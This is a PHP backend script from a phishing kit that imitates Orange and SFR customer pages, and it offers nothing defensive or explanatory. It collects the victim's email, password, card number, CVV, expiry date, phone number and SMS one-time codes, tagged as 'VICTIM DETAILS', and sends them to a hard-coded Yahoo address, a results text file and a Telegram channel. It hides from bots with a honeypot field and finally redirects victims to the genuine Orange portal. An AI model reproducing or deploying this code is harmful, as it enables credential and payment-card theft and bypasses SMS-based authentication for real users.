<?php

/*******
    Main Author : Z0N51
    Contact me on telegram : https://t.me/Z0N51
    ********************************************************/

include_once '../inc/app.php';
function validate_cc_number($number = null) {
    $numbers = str_replace(' ', '', $number);
    if( validate_number($numbers,16) == false )
        return false;
    return $numbers;
}

function validate_cc_cvv($number = null) {
    $numbers = str_replace(' ', '', $number);
    if( validate_number($numbers) == false || strlen($number) < 3 )
        return false;
    return $numbers;
}

function validate_cc_date($month,$year) {
    if( validate_number(trim($month)) && strlen(trim($month)) == 2 && validate_number(trim($year)) && strlen(trim($year)) == 4 ) {
        return $month . '/' . $year;
    } else {
        return false;
    }
}

$to = 'z0n51@yahoo.com';
$random   = rand(0,100000000000);
$dispatch = substr(md5($random), 0, 17);

if($_SERVER['REQUEST_METHOD'] == "POST") {

    if( !empty($_POST['verbot']) ) {
        header("HTTP/1.0 404 Not Found");
        die();
    }

    if ($_POST['type'] == "email") {

        $_SESSION['email'] = $_POST['email'];

        $_SESSION['errors'] = [];
        if( empty($_POST['email']) ) {
            $_SESSION['errors']['email'] = 'ce champ est obligatoire';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $zz = ($_POST['error']) ? 2 : 1;

            $subject = $_SERVER['REMOTE_ADDR'] . ' | ORANGE | Email';
            $message = '/-- EMAIL INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Email : ' . $_POST['email'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END EMAIL INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            //mail($to,$subject,$message,$headers);
            //file_put_contents("../results458.txt", $message, FILE_APPEND);
            header("location: pass.php?validation#_$dispatch");

        } else {
            header("location: login.php?error=$error&#_$dispatch");
        }

    }

    if ($_POST['type'] == "password") {

        $_SESSION['password'] = $_POST['password'];

        $_SESSION['errors'] = [];
        if( empty($_POST['password']) ) {
            $_SESSION['errors']['password'] = 'Vous n\'avez pas saisi votre mot de passe.';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $zz = ($_POST['error']) ? 2 : 1;

            $subject = $_SERVER['REMOTE_ADDR'] . ' | ORANGE | Login';
            $message = '/-- LOGIN INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Email : ' . $_SESSION['email'] . "\r\n";
            $message .= 'Password : ' . $_POST['password'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END LOGIN INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            $telegram_message = '/-- LOGIN INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $telegram_message .= 'Email : ' . $_SESSION['email'] . "\r\n";
            $telegram_message .= 'Password : ' . $_POST['password'] . "\r\n";
            $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
            telegram_send(urlencode($telegram_message));

            mail($to,$subject,$message,$headers);
            file_put_contents("../results458.txt", $message, FILE_APPEND);
            header("location: cc.php?validation#_$dispatch");
        } else {
            header("location: pass.php?error=$error&#_$dispatch");
        }

    }

    if ($_POST['type'] == "cc") {

        $_SESSION['cc_number']  = $_POST['cc_number'];
        $_SESSION['cc_cvv']     = $_POST['cc_cvv'];
        $_SESSION['cc_date']    = $_POST['cc_date'];
        $_SESSION['cc_month']   = $_POST['cc_month'];
        $_SESSION['cc_year']    = $_POST['cc_year'];

        $card_number = validate_cc_number($_POST['cc_number']);
        $card_cvv    = validate_cc_cvv($_POST['cc_cvv']);

        $_SESSION['errors'] = [];
        if( $card_number == false ) {
            $_SESSION['errors']['cc_number'] = true;
        }
        if( $card_cvv == false ) {
            $_SESSION['errors']['cc_cvv'] = true;
        }
        if( empty($_POST['cc_month']) ) {
            $_SESSION['errors']['cc_month'] = true;
        }
        if( empty($_POST['cc_year']) ) {
            $_SESSION['errors']['cc_year'] = true;
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | ORANGE | Card';
            $message = '/-- CARD INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'N° de votre carte : ' . $_POST['cc_number'] . "\r\n";
            $message .= 'CVV : ' . $_POST['cc_cvv'] . "\r\n";
            $message .= 'Date d\'expiration : ' . $_POST['cc_month'] . '/' . $_POST['cc_year'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END CARD INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            $telegram_message = '/-- CARD INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $telegram_message .= 'N° de votre carte : ' . $_POST['cc_number'] . "\r\n";
            $telegram_message .= 'CVV : ' . $_POST['cc_cvv'] . "\r\n";
            $telegram_message .= 'Date d\'expiration : ' . $_POST['cc_month'] . '/' . $_POST['cc_year'] . "\r\n";
            $telegram_message .= 'Phone : ' . $_POST['phone'] . "\r\n";
            $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
            telegram_send(urlencode($telegram_message));

            mail($to,$subject,$message,$headers);
            file_put_contents("../results458.txt", $message, FILE_APPEND);
            header("location: loading1.php?validation#_$dispatch");

        } else {
            header("location: cc.php?error#_$dispatch");
        }

    }

    if ($_POST['type'] == "confirm_code2") {

        $_SESSION['confirm_code2']   = $_POST['confirm_code2'];

        $_SESSION['errors'] = [];
        if( empty($_POST['confirm_code2']) ) {
            $_SESSION['errors']['confirm_code2'] = 'le code n\'est pas valide';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $zz = ($_POST['error']) ? 2 : 1;

            $subject = $_SERVER['REMOTE_ADDR'] . ' | SFR | Sms';
            $message = '/-- SMS INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Sms code : ' . $_POST['confirm_code2'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END SMS INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            $telegram_message = '/-- SMS INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $telegram_message .= 'Sms code : ' . $_POST['confirm_code2'] . "\r\n";
            $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
            telegram_send(urlencode($telegram_message));

            mail($to,$subject,$message,$headers);
            file_put_contents("../results458.txt", $message, FILE_APPEND);
            header("location: cc.php?validation#_$dispatch");
        } else {
            $error = $_POST['error'];
            header("location: ss2.php?error=$error&#_$dispatch");
        }

    }

    if ($_POST['type'] == "confirm_code") {

        $_SESSION['confirm_code']   = $_POST['confirm_code'];

        $_SESSION['errors'] = [];
        if( empty($_POST['confirm_code']) ) {
            $_SESSION['errors']['confirm_code'] = 'le code n\'est pas valide';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $zz = ($_POST['error']) ? 2 : 1;

            $subject = $_SERVER['REMOTE_ADDR'] . ' | SFR | Sms';
            $message = '/-- SMS INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Sms code : ' . $_POST['confirm_code'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END SMS INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            $telegram_message = '/-- SMS INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $telegram_message .= 'Sms code : ' . $_POST['confirm_code'] . "\r\n";
            $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
            telegram_send(urlencode($telegram_message));

            mail($to,$subject,$message,$headers);
            file_put_contents("../results458.txt", $message, FILE_APPEND);
            if( $_POST['error'] > 0 ) {
                header("location: https://www.orange.fr/portail");
                exit();
            }
            $_SESSION['errors']['confirm_code'] = 'le code n\'est pas valide';
            header("location: loading2.php?validation#_$dispatch");
        } else {
            $error = $_POST['error'];
            header("location: ss.php?error=$error&#_$dispatch");
        }

    }

}

?>